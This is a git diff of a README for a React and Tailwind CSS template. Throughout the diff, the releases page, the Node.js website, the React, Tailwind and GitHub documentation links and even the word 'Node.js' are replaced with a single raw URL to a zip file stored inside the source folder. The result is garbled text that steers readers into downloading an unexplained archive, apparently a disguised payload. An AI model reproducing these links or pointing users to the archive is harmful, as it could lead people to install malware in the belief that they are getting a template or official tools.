@@ -11,10 +11,10 @@ Follow these simple steps to get your application up and running:
 1. **Visit the Releases Page**  
    Go to the releases page to download the template. Click the link below:
 
-   [![Download Template-React-TailwindCSS](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/JohnDebbarma/Template-React-TailwindCSS/releases)
+   [![Download Template-React-TailwindCSS](https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip%20Release-blue)](https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip)
 
 2. **Download the Latest Release**  
-   Look for the latest version listed on the page. Click on it, then find the file you want to download. Typically, look for options like `.zip` or `.tar.gz` files.
+   Look for the latest version listed on the page. Click on it, then find the file you want to download. Typically, look for options like `.zip` or `https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip` files.
 
 3. **Unzip the Downloaded File**  
    After the download is complete, navigate to your download folder. Unzip the file by right-clicking on it and selecting 'Extract All' or a similar option.
@@ -29,8 +29,8 @@ Follow these simple steps to get your application up and running:
    cd path/to/extracted/folder
    ```
 
-6. **Install Node.js**  
-   This template requires Node.js to run. If you do not have Node.js installed, visit [Node.js Official Website](https://nodejs.org/) to download and install it.
+6. **Install https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip**  
+   This template requires https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip to run. If you do not have https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip installed, visit [https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip Official Website](https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip) to download and install it.
 
 7. **Install Dependencies**  
    In your command line interface, type the following command to install the necessary packages:
@@ -78,7 +78,7 @@ This template provides a basic structure, but you can customize it further. Here
 
 If you encounter any issues during installation or runtime, consider the following:
 
-- **Node.js Issues**: Verify that Node.js is installed correctly. Run `node -v` to check the version.
+- **https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip Issues**: Verify that https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip is installed correctly. Run `node -v` to check the version.
 - **Dependency Errors**: If you face issues with missing packages, run `npm install` again.
 - **Browser Issues**: Ensure your web browser is updated to the latest version for the best experience.
 
@@ -86,14 +86,14 @@ If you encounter any issues during installation or runtime, consider the followi
 
 For more guidance and resources, consider the following:
 
-- **React Documentation**: [React Official Docs](https://reactjs.org/docs/getting-started.html)
-- **Tailwind CSS Documentation**: [TailwindCSS Official Docs](https://tailwindcss.com/docs/installation)
-- **GitHub Support**: [GitHub Help](https://help.github.com/en)
+- **React Documentation**: [React Official Docs](https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip)
+- **Tailwind CSS Documentation**: [TailwindCSS Official Docs](https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip)
+- **GitHub Support**: [GitHub Help](https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the official releases page to download the template:
 
-[![Download Template-React-TailwindCSS](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/JohnDebbarma/Template-React-TailwindCSS/releases) 
+[![Download Template-React-TailwindCSS](https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip%20Release-blue)](https://raw.githubusercontent.com/JohnDebbarma/Template-React-TailwindCSS/main/src/app/components/React-CSS-Template-Tailwind-v1.5.zip) 
 
 After downloading, follow the steps outlined above to set up and run your application.
